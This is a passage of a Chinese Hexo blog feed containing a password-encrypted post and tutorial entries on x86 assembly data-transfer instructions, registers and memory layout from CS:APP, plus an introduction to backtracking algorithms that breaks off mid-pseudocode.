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 </div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="college" scheme="http://yoursite.com/categories/college/"/>
    
    
      <category term="college" scheme="http://yoursite.com/tags/college/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-2</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-2/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-汇编的世界-2/</id>
    <published>2018-05-05T20:47:06.000Z</published>
    <updated>2018-05-05T13:13:58.093Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>据传送指令的目的是为了将一个数据从一个位置复制到另外一个位置。既然如此，那么数据传送指令就会包含一个源操作数和一个目的操作数，指令会将原操作数的值复制到目的操作数并覆盖。</p>
<p>数据传送指令一共可分为五种，分别是<code>mov</code>、<code>movs</code>、<code>movz</code>、<code>push</code>以及<code>pop</code>。</p>
<h3 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h3><p>mov指令的作用是将源操作数S中的数据复制到目的操作数D中，mov指令有一个数据格式和两个操作数，因此一般的形式为[movx S D]。其中x为数据格式，S为源操作数，D为目的操作数。</p>
<p>这里举一个简单的例子，比如我们有一条指令为<code>movl %edx %eax</code>。那么它的执行过程就如下图所示。</p>
<p><img src="/images/汇编-06.png" alt="mov指令"></p>
<p>可以看到，在指令执行之后，%edx寄存器当中的内容会被复制到%eax寄存器。需要一提的是，mov指令可以在后面加上任何数据格式，比如上面这一过程中，数据格式则为四个字节，也就是双字。因此不难推断出，我们还可以使用movb和movw去复制一个字节或者两个字节。</p>
<h3 id="movs指令"><a href="#movs指令" class="headerlink" title="movs指令"></a>movs指令</h3><p>movs指令的作用是将源操作数S中的数据做符号扩展后，再复制到目的操作数D中，movs指令有两个数据格式和两个操作数，因此一般的形式为[movsxy S D]。其中x、y为数据格式，S为源操作数，D为目的操作数。其中x、y的组合一共有三种，分别是bw、bl、wl，这三个组合代表的意思分别是单字节到双字节，单字节到双字以及双字节到双字。</p>
<p>对于指令<code>movswl %dx %eax</code>来讲，它的作用如下图所示。</p>
<p><img src="/images/汇编-07.png" alt="movs指令"></p>
<p>这里为了可以看出符号位的扩展，因此LZ这里使用了十六进制的整数表示方式。可以看到，movs指令将0x8FFF扩展以后存入%eax寄存器，其中%dx为寄存器%edx的后16位表示。</p>
<h3 id="movz指令"><a href="#movz指令" class="headerlink" title="movz指令"></a>movz指令</h3><p>movz指令的作用是将源操作数S做零扩展后，再复制到目的操作数中。它与movs指令十分相似，也有两个数据格式和两个操作数，因此一般的形式为[movzxy S D]。其中x、y为数据格式，S为源操作数，D为目的操作数。其中x、y的组合一共有三种，分别是bw、bl、wl，这三个组合代表的意思分别是单字节到双字节，单字节到双字以及双字节到双字。</p>
<p>这里依然采用相似的示例，我们来看看对于指令<code>movzwl %dx %eax</code>来讲，它的作用与上面的movs有何不同。</p>
<p><img src="/images/汇编-08.png" alt="movz指令"></p>
<p>可以看出，movz与movs指令是十分相似的，只是这里扩展后，目标寄存器%eax的前16位为0而不再是1。</p>
<h3 id="push指令"><a href="#push指令" class="headerlink" title="push指令"></a>push指令</h3><p>push指令与上面的mov族指令有着不同，它的目的操作数被固定为栈顶，因此它的指令当中没有目的操作数。另外有一点需要注意的是，它在进行复制操作之前，需要移动栈顶指针（-4）。push指令的一般形式为[pushl S]，其中l代表数据格式为双字，S为源操作数，目的操作数默认为栈顶。</p>
<p>这里举一个简单的例子，比如<code>pushl %edx</code>这条命令，它的任务是将%edx寄存器的值复制到栈顶。我们首先来看一下命令执行前，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-09.png" alt="push指令"></p>
<p>可以看到，寄存器%ebp和%esp分别指向帧指针和栈指针，而%esp实际上就是指向的栈顶。由于现在栈顶位于-16的位置，因此若要将%edx压入栈，则先需要将栈顶移动到-20的位置，然后再进行复制，移动后的状态如下图所示。</p>
<p><img src="/images/汇编-10.png" alt="push指令"></p>
<p>可以看到，这里栈指针的位置已经发生了变化，向下移动了四位，并且将%edx寄存器的值放入新的栈顶，因此pushl %edx指令就相当于下面两条指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">subl $4,%esp</div><div class="line">movl %edx,(%esp)</div></pre></td></tr></table></figure></p>
<p>###pop指令</p>
<p>pop指令与push指令是做的相反的操作，一个是入栈一个是出栈。对于pop指令来讲，它的源操作数被固定为栈顶，相反，它会先进行复制操作，然后再移动栈指针。pop指令的一般形式为[popl D]，其中l代表数据格式为双字，D为目的操作数，源操作数默认为栈顶。</p>
<p>接下来我们举一个例子，与上面的例子类似，我们考虑<code>popl %edx</code>这条指令的效果，它会将栈顶的值弹出到寄存器%edx。首先来看执行之前，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-11.png" alt="ppo指令"></p>
<p>接下来执行pop指令时，会先将栈顶的值复制到%edx，然后再将栈指针移动（+4）。我们来看一下它执行后的状态。</p>
<p><img src="/images/汇编-12.png" alt="ppo指令"></p>
<p>可以看到，之前栈顶的内容已经被弹出到%edx寄存器，并且当前栈顶已经移动到了-16的位置，也就是进行了+4操作。因此popl %edx指令就相当于下面两条指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">movl (%esp),%edx</div><div class="line">addl $4,%esp</div></pre></td></tr></table></figure></p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer15.html" target="_blank" rel="external">深入理解计算机系统（3.3）—数据传送（或者说复制）指令详解</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;数据传送指令&quot;&gt;&lt;a href=&quot;#数据传送指令&quot; class=&quot;headerlink&quot; title=&quot;数据传送指令&quot;&gt;&lt;/a&gt;数据传送指令&lt;/h3&gt;&lt;p&gt;据传送指令的目的是为了将一个数据从一个位置复制到另外一个位置。既然如此，那么数据传送指令就会包含一个源操作数
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-1</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-1/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-汇编的世界-1/</id>
    <published>2018-05-05T20:38:21.000Z</published>
    <updated>2018-05-05T12:46:53.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="汇编层次的对象"><a href="#汇编层次的对象" class="headerlink" title="汇编层次的对象"></a>汇编层次的对象</h3><p>在平时的开发过程中，CPU处理器的状态对开发者是隐藏的，我们看不到CPU当中各个对象的状态。但是在汇编语言中，我们可以清楚的看到这些对象的状态，其中CPU主要包含以下几个对象。</p>
<ul>
<li>程序计数器（PC）：记录下一条指令的地址。</li>
<li>整数寄存器文件：共8个，可以存储一些地址或者整数的数据。</li>
<li>条件寄存器：保存算数或逻辑指令的状态信息，可以实现程序的流程控制。</li>
<li>浮点寄存器：存储浮点数。</li>
</ul>
<p>　　可以看出，这些都是CPU处理器当中的对象，这是汇编层面能操作的寄存器，当然，还有一节寄存器是我们不能操作的，比如说时钟寄存器。</p>
<h3 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h3><p>在汇编指令中，有三种表示数据的格式：</p>
<ul>
<li>一种是$符号后跟一个标准C表示的整数，比如$100，$0x11等等</li>
<li>第二种则是寄存器，当它作为一个操作数的时候，则是取的寄存器当中的数值。另外，对于寄存器来说，也可以选择性的操作4个、2个、1个字节，而并不一定非要操作4个字节</li>
<li>最后一种，则是我们相对来说最熟悉的，就是存储器或者说内存。当它作为一个操作数的时候，会去计算存储器地址的数值，然后去这个地址取相应的数值。</li>
</ul>
<p><img src="/images/汇编-05.png" alt="数据格式"></p>
<p>第一列是代表的类型，而第一行则是指的立即数，第二行则是指的寄存器，而剩下的都是存储器了。对于立即数和寄存器来讲，比较好理解，就是直接取值或者取寄存器的值。而对于存储器来讲，则有很多种情况，不过我们也可以看出，上面所有的情况，其实都是最后一种的特殊情况。Imm(Eb,Ei,s)是存储器取值的一般形式，比如当Imm为0时，则是倒数第二种取值方式。对于其它的形式，也可以使用同样的方式推算出来。</p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer14.html" target="_blank" rel="external">深入理解计算机系统（3.2）—数据格式、访问信息以及操作数指示符</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;汇编层次的对象&quot;&gt;&lt;a href=&quot;#汇编层次的对象&quot; class=&quot;headerlink&quot; title=&quot;汇编层次的对象&quot;&gt;&lt;/a&gt;汇编层次的对象&lt;/h3&gt;&lt;p&gt;在平时的开发过程中，CPU处理器的状态对开发者是隐藏的，我们看不到CPU当中各个对象的状态。但是在汇
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|走进汇编的世界</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E8%B5%B0%E8%BF%9B%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-走进汇编的世界/</id>
    <published>2018-05-05T20:03:58.000Z</published>
    <updated>2018-05-05T12:36:59.063Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什么，以及代码的运行步骤，就一定要学习汇编语言。</p>
<h3 id="What"><a href="#What" class="headerlink" title="What"></a>What</h3><p>我们知道，CPU 只负责计算，本身不具备智能。你输入一条指令（instruction），它就运行一次，然后停下来，等待下一条指令。</p>
<p>这些指令都是二进制的，称为操作码（opcode），比如加法指令就是00000011。编译器的作用，就是将高级语言写好的程序，翻译成一条条操作码。</p>
<p>对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。</p>
<p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令00000011写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>
<h3 id="初次体会汇编"><a href="#初次体会汇编" class="headerlink" title="初次体会汇编"></a>初次体会汇编</h3><p>在编译一段C语言程序的过程中，其实做了很多步骤，比如预编译处理、编译处理、汇编处理以及链接处理。我们要了解的汇编语言，就是在编译处理后的产物。因此我们可以在GCC的编译器当中加入一些参数来控制它只生成汇编语言，而不进行汇编处理和链接处理。</p>
<p>我们看下面这一段简单的C语言代码，假设为sum.c。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">int simple(int *xp,int y)&#123;</div><div class="line">    int t = *xp+y;</div><div class="line">    *xp=t;</div><div class="line">    return t;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们使用GCC编译器加-S参数来编译这段代码，最终我们可以得到一个sum.s的文件，我们使用cat来查看一下这个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.file    &quot;sum.c&quot;</div><div class="line">    .text</div><div class="line">.globl simple</div><div class="line">    .type    simple, @function</div><div class="line">simple:</div><div class="line">    pushl    %ebp</div><div class="line">    movl    %esp, %ebp</div><div class="line">    subl    $16, %esp</div><div class="line">    movl    8(%ebp), %eax//这一步是从主存取变量xp</div><div class="line">    movl    (%eax), %eax//取*xp的值</div><div class="line">    addl    12(%ebp), %eax//计算*xp+y，并存到%eax寄存器</div><div class="line">    movl    %eax, -4(%ebp)//将*xp+y赋给变量t</div><div class="line">    movl    8(%ebp), %eax//再取xp</div><div class="line">    movl    -4(%ebp), %edx//取t</div><div class="line">    movl    %edx, (%eax)//执行t-&gt;*xp</div><div class="line">    movl    -4(%ebp), %eax//将t放入%eax准备返回</div><div class="line">    leave</div><div class="line">    ret</div><div class="line">    .size    simple, .-simple</div><div class="line">    .ident    &quot;GCC: (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3&quot;</div><div class="line">    .section    .note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure></p>
<p>有些人可能会惊讶，为什么我们的源代码只有短短的三行，但是汇编的代码却有这么多行。这是很正常的，汇编指令能做的事情是很简单的，比如我们的加法运算，我们需要去内存中找到操作数，把内存中的操作数存在寄存器中，然后在进行加法运算。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>学习汇编语言，首先必须了解两个知识点：寄存器和内存模型。</p>
<p>先来看寄存器。CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。</p>
<p>但是，CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。</p>
<p>寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。</p>
<p><img src="/images/汇编-04.png" alt="寄存器"></p>
<h3 id="内存模型：Heap"><a href="#内存模型：Heap" class="headerlink" title="内存模型：Heap"></a>内存模型：Heap</h3><p>寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。</p>
<p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址</p>
<p><img src="/images/汇编-03.png" alt="内存模型"></p>
<p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用malloc命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址0x1000开始给他分配，一直分配到地址0x100A，如果再要求得到22个字节，那么就分配到0x1020。</p>
<p><img src="/images/汇编-01.png" alt="内存模型"></p>
<p>这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。</p>
<h3 id="内存模型：Stack"><a href="#内存模型：Stack" class="headerlink" title="内存模型：Stack"></a>内存模型：Stack</h3><p>除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。这里所说的栈与数据结构里的栈的思想是一样的，数据的操作都是<code>后进先出</code>。为什么这样呢，栈是为函数调用服务的，最后调用的函数进栈，哪当然是最后调用的函数先执行完，然后释放其占用的空间。<br><img src="/images/汇编-02.png" alt="Stack模型"></p>
<p><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="external">汇编语言入门教程</a><br><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="external">深入理解计算机系统（3.1）—走进汇编的世界</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|回溯法</title>
    <link href="http://yoursite.com/2018/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
    <id>http://yoursite.com/2018/05/04/计算机算法-回溯法/</id>
    <published>2018-05-03T23:08:09.000Z</published>
    <updated>2018-05-03T16:38:43.022Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>回溯算法(Backtracking)</code>实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。</p>
<p>回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。</p>
<p>许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。</p>
<p>用爬山来比喻回溯，好比从山脚下找一条爬上山顶的路,起初有好几条道可走,当选择一条道走到某处时,又有几条岔道可供选择,只能选择其中一条道往前走,若能这样子顺利爬上山顶则罢了,否则走到一条绝路上时,只好返回到最近的一个路口,重新选择另一条没走过的道往前走。如果该路口的所有路都走不通,只得从该路口继续回返。照此规则走下去,要么找到一条到达山顶的路,要么最终试过所有可能的道,无法到达山顶。</p>
<p><strong>回溯是一种穷举，但与brute force有一些区别，回溯带了两点脑子的，并不多，brute force一点也没带。</strong></p>
<ul>
<li>第一点脑子是回溯知道回头；相反如果是brute force,发现走不通立刻跳下山摔死，换第二条命从头换一条路走。</li>
<li>第二点脑子是回溯知道剪枝；如果有一条岔路上放了一坨屎，那这条路我们不走，就可以少走很多不必要走的路。</li>
</ul>
<p>回溯法搜索解空间树的时候，通常有两种策略来避免无效搜索，即 剪枝函数：</p>
<ul>
<li>约束函数：在扩展节点处剪去不满足约束的子树，</li>
<li>限界函数：剪去不能得到最优解的子树。</li>
</ul>
<p>还有一些爱混淆的概念：递归，回溯，DFS。</p>
<ul>
<li>回溯是一种找路方法，搜索的时候走不通就回头换路接着走，直到走通了或者发现此山根本不通。</li>
<li>DFS是一种开路策略，就是一条道先走到头，再往回走一步换一条路走到头，这也是回溯用到的策略。<strong>在树和图上回溯时人们叫它DFS。</strong></li>
<li>递归是一种行为，回溯和递归如出一辙，都是一言不合就回到来时的路，所以一般回溯用递归实现；当然也可以不用，用栈。</li>
</ul>
<h3 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h3><p>在包含问题的所有解的解空间树中，按照深度优先搜索的策略，从根结点出发深度探索解空间树。当探索到某一结点时，要先判断该结点是否包含问题的解，如果包含，就从该结点出发继续探索下去，如果该结点不包含问题的解，则逐层向其祖先结点回溯。（其实回溯法就是对隐式图的深度优先搜索算法）。</p>
<p>若用回溯法求问题的所有解时，要回溯到根，且根结点的所有可行的子树都要已被搜索遍才结束。</p>
<p>而若使用回溯法求任一个解时，只要搜索到问题的一个解就可以结束。</p>
<h3 id="用回溯法解题的一般步骤"><a href="#用回溯法解题的一般步骤" class="headerlink" title="用回溯法解题的一般步骤"></a>用回溯法解题的一般步骤</h3><ol>
<li>针对所给问题，确定问题的解空间：首先应明确定义问题的解空间，问题的解空间应至少包含问题的一个（最优）解。</li>
<li>确定结点的扩展搜索规则</li>
<li>以深度优先方式搜索解空间，并在搜索过程中用剪枝函数避免无效搜索。</li>
</ol>
<h3 id="算法框架"><a href="#算法框架" class="headerlink" title="算法框架"></a>算法框架</h3><p>问题框架</p>
<p>设问题的解是一个n维向量(a1,a2,………,an),约束条件是ai(i=1,2,3,…..,n)之间满足某种条件，记为f(ai)。</p>
<p>非递归回溯框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"> 1: int a[n],i;</div><div class="line"> 2: 初始化数组a[];</div><div class="line"> 3: i = 1;</div><div class="line"> 4: while (i&gt;0(有路可走)   and  (未达到目标))  // 还未回溯到头</div><div class="line"> 5: &#123;</div><div class="line"> 6:     if(i &gt; n)                                              // 搜索到叶结点</div><div class="line"> 7:     &#123;   </div><div class="line"> 8:           搜索到一个解，输出；</div><div class="line"> 9:     &#125;</div><div class="line">10:     else                                                   // 处理第i个元素</div><div class="line">11:     &#123; </div><div class="line">12:           a[i]第一个可能的值；</div><div class="line">13:           while(a[i]在不满足约束条件且在搜索空间内)</div><div class="line">14:           